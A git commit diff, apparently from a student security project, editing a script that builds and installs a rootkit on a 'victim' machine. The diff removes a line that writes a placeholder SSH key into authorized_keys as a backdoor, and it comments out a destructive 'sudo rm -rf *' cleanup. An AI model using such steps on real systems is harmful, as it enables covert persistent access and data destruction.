47e8c1a8bb16a7aca89d6a329ff9f4819ce9da7f
samo <samuel.adoni-willybiro@epita.fr>
2025-06-03 15:05:38 +0200

    ENOCADAGE SANS SUPPRESSION

--- VICTIME/configuration_rootkit.sh
+++ VICTIME/configuration_rootkit.sh
@@ -9,14 +9,9 @@ sudo bash encodage.sh init &&
 echo "Lancer le makefile du rootkit"
 cd rootkit && make all && make install &&
 
-
-echo "insertion clef ssh dans la victime"
-sudo echo "SSKEY" > ~/.ssh/authorized_keys &&
-
-
-
-echo "FIN DE L'INSTALLATION DU ROOTKIT ET SUPPRESSION DES FICHIERS"
-sudo rm -rf *
+cd ..
+#echo "FIN DE L'INSTALLATION DU ROOTKIT ET SUPPRESSION DES FICHIERS"
+#sudo rm -rf *
 
 exit 0
 
